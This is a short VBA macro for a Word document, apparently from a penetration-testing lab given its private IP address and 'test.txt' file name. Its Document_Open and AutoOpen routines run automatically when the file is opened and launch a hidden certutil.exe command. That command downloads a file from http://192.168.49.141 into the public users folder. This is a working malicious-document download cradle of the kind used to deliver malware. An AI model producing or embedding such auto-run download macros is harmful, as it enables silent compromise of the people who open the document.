Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "certutil.exe -urlcache -f http://192.168.49.141/test.txt c:\\users\\public\\test.txt"
    CreateObject("Wscript.Shell").Run str, 0
End Sub


Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
